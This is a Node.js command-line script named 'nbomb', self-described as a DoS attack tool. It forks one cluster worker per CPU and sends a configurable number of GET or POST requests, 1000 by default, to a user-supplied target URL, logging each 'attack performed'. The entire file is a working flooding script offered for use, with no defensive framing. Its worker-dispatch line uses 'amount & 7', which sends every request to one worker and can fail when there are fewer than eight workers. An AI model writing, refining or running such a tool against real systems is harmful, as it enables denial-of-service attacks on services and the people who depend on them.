#!/usr/local/bin/node

import cluster from "cluster";
import colors from "colors";
import argv from "command-line-args";
import commandLineUsage from "command-line-usage";
import os from "os";
import axios from "axios";

import "@babel/polyfill";

const numCpus = os.cpus().length;

if (cluster.isMaster) {
  const optionList = [
    {
      name: "target",
      alias: "t",
      type: String,
      description: "target to attack\n",
      typeLabel: "{underline url}"
    },
    {
      name: "method",
      alias: "m",
      type: String,
      defaultValue: "GET",
      description: "method for attack [default value is GET]\n",
      typeLabel: "{underline GET POST}"
    },
    {
      name: "amount",
      alias: "a",
      type: Number,
      defaultValue: 1000,
      description: "amount to send attacks [default value is 1000]\n"
    },
    // {
    //   name: "interval",
    //   alias: "i",
    //   type: Number,
    //   defaultValue: 0,
    //   description: `interval to rest while sending next attack.
    //     don't use it if you don't know what it does [default is 0]\n`
    // },
    {
      name: "help",
      alias: "h",
      type: Boolean,
      description: "show this help\n",
      typeLabel: ""
    }
  ];

  const options = argv(optionList);
  if (options.help || !options.target) {
    console.log(
      commandLineUsage([
        { header: "nbomb", content: "Dos attack tool made with node.js" },
        {
          header: "Options",
          optionList
        },
        {
          content: "{underline k9326239@gmail.com}"
        }
      ])
    );
    process.exit();
  }

  console.log("NBomb Started");
  console.log("Reading options");

  let clusters = [];

  // Fork workers.
  for (let i = 0; i < numCpus; i++) {
    clusters.push(cluster.fork());
  }

  let counter = options.amount;
  clusters.forEach((cluster, i) => {
    cluster.on("online", () => {
      console.log(`worker ${i} online`);
    });
    cluster.on("message", () => {
      counter -= 1;
      if (counter < 1) return process.exit();
    });
    cluster.on("exit", () => {
      console.log(`worker ${i} offline`);
    });
  });

  for (let i = 0, amount = options.amount; i < amount; i++) {
    clusters[Math.floor(amount & 7)].send({ ...options, left: amount - i });
  }
} else {
  process.on("message", msg => {
    axios({
      url: msg.target,
      method: msg.method
    })
      .then(() => {
        console.log(colors.green("attack performed ", colors.blue(msg.left)));
      })
      .catch(() => {
        console.log(colors.red("ERROR ", colors.blue(msg.left)));
      })
      .finally(() => {
        process.send("");
      });
  });
}
